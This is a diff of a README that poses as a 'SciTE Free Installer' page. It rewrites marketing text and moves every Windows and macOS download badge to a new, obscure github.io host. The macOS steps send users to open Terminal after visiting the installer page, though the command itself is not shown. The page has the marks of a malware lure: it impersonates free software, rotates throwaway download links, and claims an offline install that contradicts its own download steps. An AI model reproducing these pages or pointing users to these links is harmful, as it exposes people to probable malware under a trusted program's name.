@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 SciTE Free Installer** — SciTE is a free, lightweight cross-platform text editor built on the Scintilla editing component. Works without internet access, no account required. Full offline installation.
+**💻 SciTE Free Installer** — SciTE is a free, lightweight, cross-platform text editor built on the Scintilla editing component. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About SciTE
 
-SciTE is a free, lightweight cross-platform text editor built on the Scintilla editing component. Originally designed for source code editing, SciTE supports syntax highlighting for over 100 programming languages, folding, regular expressions, and can run build commands. Its minimal design, portability, and speed make it a favorite for quick edits and lightweight programming on Windows, macOS, and Linux.
+SciTE is a free, lightweight, cross-platform text editor built on the Scintilla editing component. It is fast, starts instantly, and provides syntax highlighting for dozens of languages with a clean, minimal interface — long used as a Notepad replacement and lightweight IDE.
 
 ---
 
 ## ❌ Problem: SciTE is hard to access
 
-- **Dated Interface** — Minimalist UI without modern UI conventions
-- **Configuration** — All customization done through properties files, not a GUI
-- **Feature Limitations** — Basic feature set without modern IDE-like capabilities
-- **Learning Resources** — Documentation less beginner-friendly than major editors
+- **Dated Interface** — UI significantly less modern than contemporary code editors
+- **Limited Features** — Missing many features users now expect: Git integration, extensions, etc.
+- **Configuration File Based** — Customization requires editing property files rather than a GUI
+- **Small Community** — Fewer tutorials and themes than mainstream editors
 
 ---
 
@@ -61,9 +61,9 @@ SciTE is a free, lightweight cross-platform text editor built on the Scintilla e
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ SciTE is a free, lightweight cross-platform text editor built on the Scintilla e
 
 <div align="center">
 
-[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ SciTE is a free, lightweight cross-platform text editor built on the Scintilla e
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ SciTE is a free, lightweight cross-platform text editor built on the Scintilla e
 
 ---
 
-**SciTE Free Installer** — SciTE is a free, lightweight cross-platform text editor built on the Scintilla editing component. Install without internet connection today!
+**SciTE Free Installer** — SciTE is a free, lightweight, cross-platform text editor built on the Scintilla editing component. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SciTE](https://img.shields.io/badge/⬇_Install_SciTE-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
